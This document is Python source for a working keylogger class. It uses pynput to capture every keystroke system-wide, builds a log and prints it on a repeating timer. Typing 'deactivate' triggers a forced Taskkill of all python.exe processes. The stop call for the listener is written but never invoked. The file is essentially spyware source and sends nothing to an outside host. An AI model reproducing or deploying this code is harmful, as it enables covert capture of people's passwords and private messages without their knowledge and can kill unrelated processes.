import pynput.keyboard
import threading
import subprocess

class KeyLogger: 
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval
        self.start()

    def append_to_log(self, string):
        self.log += string

    
    def process_key_press(self, key):
    
        
        try: 
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.shift_r or key == key.tab or key == key.shift or key=='Key.left' or key=='Key.right' or key=='Key.up' or key == 'Key.down':
                current_key= ""
            elif key==key.backspace:
                current_key= "\b \b"
            else:
                current_key= " " + str(key) + " "
        self.append_to_log(current_key)

    def checkforexit(self,log):
        if 'deactivate' in log:
            pynput.keyboard.Listener.stop
            command = "Taskkill /IM \"python.exe\" /F"
            subprocess.call(command)

    def report(self):
        
        print(self.log)
        self.checkforexit(self.log)
         
        self.log = ""                    #Since we've already logged the previous result, we start fresh by resetting the log variable. 
        timer = threading.Timer(self.interval, self.report)
        timer.start()

        

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()            #This is going to start the keyboard listener. 
